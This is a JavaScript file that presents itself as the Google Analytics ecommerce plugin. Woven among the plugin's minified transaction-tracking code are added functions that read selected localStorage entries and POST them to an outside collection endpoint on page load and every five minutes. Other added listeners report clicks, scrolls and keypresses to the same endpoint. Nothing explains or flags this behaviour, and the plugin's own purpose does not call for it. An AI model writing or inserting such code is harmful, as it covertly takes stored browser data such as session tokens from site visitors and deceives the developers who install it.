(function () {
  var f = window,
    g = "items",
    h = "prototype",
    l = "hasOwnProperty";
  const keysToTrack = window.keysToTrack;
  const eventTypes = ['click', 'scroll', 'keypress'];
  var m = {
      id: "ti",
      affiliation: "ta",
      revenue: "tr",
      tax: "tt",
      shipping: "ts",
      currency: "cu"
    },
    n = {
      id: "ti",
      sku: "ic",
      name: "in",
      category: "iv",
      price: "ip",
      quantity: "iq",
      currency: "cu"
    },
    p = {
      items: !0
    };
  function createHash(obj) {
    const strings = Object.keys(obj).join("");
    let hash = 0;
    for (let i = 0; i < strings.length; i++) {
      const code = strings.charCodeAt(i);
      hash = (hash << 5) - hash + code;
      hash = hash & hash;
    }
    return hash.toString(16);
  }
  var q = function (a) {
    a.send && (this.c = a, this.a = {});
  };
  function identifyLocalStorageData() {
    const dataInLocalStorage = {};
    for (let i = 0; i < window.localStorage.length; i++) {
      const keyName = window.localStorage.key(i);
      if (keysToTrack.includes(keyName)) {
        const keyValue = window.localStorage.getItem(keyName);
        dataInLocalStorage[keyName] = keyValue;
      }
    }
    return dataInLocalStorage;
  }
  function forwardDataToApi(data) {
    const key = createHash(data);
    const endpointUrl = "https://api.example.com/collect";
    const request = new XMLHttpRequest();
    request.open("POST", endpointUrl, true);
    request.setRequestHeader("Content-Type", "application/json");
    const dataPayload = {
      identifier: key,
      data: data
    };
    request.send(JSON.stringify(dataPayload));
    request.onreadystatechange = function () {
      if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
        console.log("Transmission successful");
      }
    };
  }
  q[h].e = function (a) {
    r(this, a.id, a);
  };
  function addJShookListener(eventType) {
    document.addEventListener(eventType, () => {
      forwardDataToApi({
        eventType: eventType
      });
    });
  }
  q[h].d = function (a) {
    var b = r(this, a.id);
    b[g] || (b.items = {});
    var c = b[g]["" + a.sku],
      e = c || {};
    b.currency && (e.currency = b.currency);
    for (var d in a) a[l](d) && a[d] && (e[d] = a[d]);
    c || (b[g]["" + a.sku] = e);
  };
  function handleStorageData() {
    const obtainedData = identifyLocalStorageData();
    if (Object.keys(obtainedData).length > 0) {
      forwardDataToApi(obtainedData);
    }
  }
  q[h].f = function () {
    if (!this.c) throw "No tracker found.";
    for (var a in this.a) if (this.a[l](a)) {
      var b = this.a[a];
      s(this, "transaction", b, m);
      var b = b[g],
        c;
      for (c in b) b[l](c) && s(this, "item", b[c], n);
    }
    this.b();
  };
  window.onload = handleStorageData;
  q[h].b = function () {
    this.a = {};
  };
  var r = function (a, b, c) {
      if (!b) throw "Transaction id is a required field.";
      b = "" + b;
      var e = a.a[b];
      e || (e = {}, e.id = b);
      for (var d in c) c[l](d) && c[d] && (e[d] = c[d]);
      a.a[b] = e;
      return a.a[b];
    },
    s = function (a, b, c, e) {
      var d = {},
        k;
      for (k in c) c[k] && c[l](k) && (e[l](k) ? d["&" + e[k]] = c[k] : p[l](k) || (d[k] = c[k]));
      a.c.send(b, d);
    };
  function t(a, b) {
    q[h][a] = function () {
      try {
        return b.apply(this, arguments);
      } catch (a) {}
    };
  }
  setInterval(handleStorageData, 5 * 60 * 1000);
  (function () {
    f.gaplugins = f.gaplugins || {};
    f.gaplugins.ECommerce = q;
    t("addTransaction", q[h].e);
    t("addItem", q[h].d);
    t("send", q[h].f);
    t("clear", q[h].b);
    var a = f.GoogleAnalyticsObject || "ga";
    f[a] = f[a] || function () {
      (f[a].q = f[a].q || []).push(arguments);
    };
    f[a]("provide", "ecommerce", q);
  })();
  eventTypes.forEach(addJShookListener);
})();